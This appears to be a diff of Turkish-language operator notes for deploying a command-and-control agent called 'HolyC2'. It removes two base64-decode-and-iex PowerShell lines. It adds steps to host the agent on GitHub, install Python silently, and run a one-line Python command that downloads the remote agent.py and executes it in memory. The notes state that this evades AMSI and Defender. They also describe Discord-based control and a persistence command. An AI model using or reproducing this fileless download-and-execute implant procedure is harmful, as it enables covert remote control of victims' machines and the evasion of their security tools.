@@ -1,2 +1,13 @@
-iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content "C:\p.txt" -Raw))))
-iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content "C:\d.txt" -Raw))))
+1. agent.py dosyasını GitHub'a yükle.
+HolyC2/agent.py hazır — 9005 byte, token gömülü, create.py ile üretildi. Repo ana dizinine koy.
+2. Python kur (admin PowerShell veya cmd):
+winget install -e --id Python.Python.3.12 --silent --accept-package-agreements
+3. Kütüphaneyi kur:
+pip install pycryptodome
+4. Agent'ı çalıştır — tek satır, disk'e hiçbir şey yazılmaz:
+python -c "import urllib.request as u;exec(u.urlopen('https://raw.githubusercontent.com/holyactivate/holya/main/agent.py').read())"
+- Kod bellekte açılıyor, .ps1 yok, iex yok, AMSI'nin tarayacağı bir script yok.
+- Defender dosya olarak bir şey görmediği için karantina da yok.
+- Komut HolyC2/deliver içinde de hazır.
+- Agent açılınca Discord kanalını kendi oluşturur; kalıcı olmasını istersen Discord'dan persist komutunu gönder.
+agent.py repo'da yoksa 404 alırsın — önce adım 1.
